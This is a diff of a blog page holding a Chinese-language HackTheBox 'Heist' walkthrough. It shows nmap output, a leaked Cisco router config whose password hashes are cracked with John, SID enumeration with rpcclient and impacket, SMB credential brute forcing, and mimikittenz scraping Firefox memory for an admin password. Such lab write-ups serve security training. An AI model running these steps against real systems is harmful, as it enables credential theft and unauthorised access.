@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;201  10.10.10.149                                                                                                              端口扫描1234567891011121">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;201  10.10.10.149   端口扫描12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.10.149Host discovery disabled (-Pn). All addr">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Heist - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/03/05/Heist-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;201  10.10.10.149                                                                                                              端口扫描1234567891011121">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;201  10.10.10.149   端口扫描12345678910111213141516171819202122232425262728293031$ nmap -sC -sV -Pn 10.10.10.149Host discovery disabled (-Pn). All addr">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042301.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042302.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042303.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -211,36 +218,15 @@
 </li>
 <li><h2 id="10-10-10-149"><a href="#10-10-10-149" class="headerlink" title="10.10.10.149"></a>10.10.10.149</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042301.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042301.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.10.149</span></span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-23 14:52 CST</span><br><span class="line">Nmap scan report for 10.10.10.149</span><br><span class="line">Host is up (0.070s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-title: Support Login Page</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2021-04-23T06:53:37</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 108.08 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个登录页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042302.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042302.jpg" alt=""></p>
 <h1 id="guest"><a href="#guest" class="headerlink" title="guest"></a>guest</h1><p>80有guest访问，附件给出config，是cisco路由器：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042303.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042303.jpg" alt=""></p>
 <h2 id="config-txt"><a href="#config-txt" class="headerlink" title="config.txt"></a>config.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">version 12.2</span><br><span class="line">no service pad</span><br><span class="line">service password-encryption</span><br><span class="line">!</span><br><span class="line">isdn switch-type basic-5ess</span><br><span class="line">!</span><br><span class="line">hostname ios-1</span><br><span class="line">!</span><br><span class="line">security passwords min-length 12</span><br><span class="line">enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91</span><br><span class="line">!</span><br><span class="line">username rout3r password 7 0242114B0E143F015F5D1E161713</span><br><span class="line">username admin privilege 15 password 7 02375012182C1A1D751618034F36415408</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">ip ssh authentication-retries 5</span><br><span class="line">ip ssh version 2</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">router bgp 100</span><br><span class="line"> synchronization</span><br><span class="line"> bgp log-neighbor-changes</span><br><span class="line"> bgp dampening</span><br><span class="line"> network 192.168.0.0Â mask 300.255.255.0</span><br><span class="line"> timers bgp 3 9</span><br><span class="line"> redistribute connected</span><br><span class="line">!</span><br><span class="line">ip classless</span><br><span class="line">ip route 0.0.0.0 0.0.0.0 192.168.0.1</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">access-list 101 permit ip any any</span><br><span class="line">dialer-list 1 protocol ip list 101</span><br><span class="line">!</span><br><span class="line">no ip http server</span><br><span class="line">no ip http secure-server</span><br><span class="line">!</span><br><span class="line">line vty 0 4</span><br><span class="line"> session-timeout 600</span><br><span class="line"> authorization exec SSH</span><br><span class="line"> transport input ssh</span><br></pre></td></tr></table></figure>
 
 <h2 id="hash-crack"><a href="#hash-crack" class="headerlink" title="hash crack"></a>hash crack</h2><p>5型用John，7型可以直接在线：</p>
@@ -250,44 +236,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0242114B0E143F015F5D1E161713 ： $uperP@ssword</span><br><span class="line">02375012182C1A1D751618034F36415408 ： Q4)sJu\Y8qz*A3?d</span><br><span class="line"></span><br><span class="line">stealth1agent</span><br><span class="line"></span><br><span class="line">➜  Desktop sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;</span><br><span class="line">Use the &quot;--format&#x3D;md5crypt-long&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256&#x2F;256 AVX2 8x3])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">stealth1agent    (?)</span><br><span class="line">1g 0:00:00:20 DONE (2021-04-19 11:07) 0.04921g&#x2F;s 172507p&#x2F;s 172507c&#x2F;s 172507C&#x2F;s stealthy001..steak7893</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
 
 <h1 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h1><p>现在我们有四个用户名(hazard是guest访问里得到的)和三个密码，可以组合来爆破smb:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042304.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042304.jpg" alt=""></p>
 <h2 id="share"><a href="#share" class="headerlink" title="share"></a>share</h2><p>smb里没什么东西，当前用户密码也不能winrm登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042305.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042305.jpg" alt=""></p>
 <h1 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h1><p>可以通过rpc获取用户名：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop rpcclient -U 'hazard%stealth1agent' 10.10.10.149</span><br><span class="line">rpcclient $&gt; lookupnames hazard</span><br><span class="line">hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)</span><br><span class="line">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008</span><br><span class="line">S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)</span><br><span class="line">rpcclient $&gt; ^C</span><br><span class="line">➜  Desktop impacket-lookupsid hazard:stealth1agent@10.10.10.149</span><br><span class="line">Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at 10.10.10.149</span><br><span class="line">[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112</span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure>
 
 <h2 id="brute"><a href="#brute" class="headerlink" title="brute"></a>brute</h2><p>得到的用户名加入字典再次爆破，得到：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042306.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042306.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>这组账号密码可以winrm登录，桌面得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042307.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042307.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>根据todo.txt,Stuff会检查issue，issue就是前面我们看到的guest页面里的东西，那他是通过什么检查呢，可以猜到浏览器，而根据login我们可以看到登录密码是明文的，所以大概就是dump firefox的内存获取密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Stuff to-do:</span><br><span class="line">1. Keep checking the issues list.</span><br><span class="line">2. Fix the router config.</span><br><span class="line"></span><br><span class="line">Done:</span><br><span class="line">1. Restricted access for guest user.</span><br></pre></td></tr></table></figure>
 
@@ -295,36 +253,15 @@
 <ul>
 <li><a href="https://github.com/orlyjamie/mimikittenz" target="_blank" rel="noopener">https://github.com/orlyjamie/mimikittenz</a></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042308.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042308.jpg" alt=""></p>
 <p>修改脚本里的正则，然后加载上去运行，得到密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[mimikittenz.MemProcInspector]::AddRegex(&quot;Heist&quot;,&quot;login_username&#x3D;.&#123;1,20&#125;@.&#123;1,20&#125;&amp;login_password&#x3D;.&#123;1,50&#125;&amp;login&#x3D;&quot;)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042309.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042309.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Heist       login_username&#x3D;admin@support.htb&amp;login_password&#x3D;4dD!5&#125;x&#x2F;re8]FBuZ&amp;login&#x3D;</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>得到的就是Administrator密码，登录上去桌面得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042310.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021042310.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html" target="_blank" rel="noopener">http://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html</a></li>
 <li><a href="https://github.com/orlyjamie/mimikittenz" target="_blank" rel="noopener">https://github.com/orlyjamie/mimikittenz</a></li>
@@ -340,7 +277,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-04-23T07:49:48.431Z" itemprop="dateUpdated">2021-04-23 15:49:48</time>
+    Last updated: <time datetime="2021-04-23T07:49:48.431Z" itemprop="dateUpdated">2021-04-23 15:49:48</time>
 </span><br>
 
 
@@ -507,11 +444,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
